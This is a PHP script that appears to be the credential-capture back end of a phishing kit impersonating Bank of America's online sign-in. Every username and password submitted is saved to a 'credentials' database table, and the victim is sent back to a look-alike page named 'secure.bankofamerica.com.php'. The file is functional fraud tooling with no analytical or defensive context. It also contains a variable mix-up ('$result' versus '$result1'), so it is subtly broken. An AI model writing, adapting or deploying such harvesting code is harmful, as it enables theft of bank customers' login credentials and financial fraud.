<?php
	require_once('connect.php');
	global $conn; 

	session_start();
if($_SERVER["REQUEST_METHOD"] == "POST"){

	$user = $_POST['user'];
	$pass = $_POST['pass'];
	$_SESSION['nouser'] = 'yes';

	if(empty($user) || !isset($_POST['user']) || $user == '' || is_null($_POST['user'])){
		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
		exit;
	}else if(empty($pass) || $pass == '' || is_null($user)){
		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
		exit;
	}
	try{
	$sql1 = "SELECT username, password FROM credentials WHERE username = :user AND password = :pass";
	$stmt1 = $conn->prepare($sql1);
	$stmt1->bindValue(':user',$user);
	$stmt1->bindValue(':pass',$pass);
	$stmt1->execute();
	
	$result1 = $stmt1->fetch();
	if($result == false){
		$sql2 = "INSERT INTO credentials (username, password) VALUES (:user,:pass)";
		$stmt2 = $conn->prepare($sql2);
		$stmt2->bindValue(':user',$user);
		$stmt2->bindValue(':pass',$pass);
		$stmt2->execute();
		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
		exit;
	}else{
		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
		exit;
	}
	} catch (PDOException $e){
		header("Location: secure.bankofamerica.com.php?/login/sign-in/signOnV2Screen.go");
		exit;
	}
}
?>
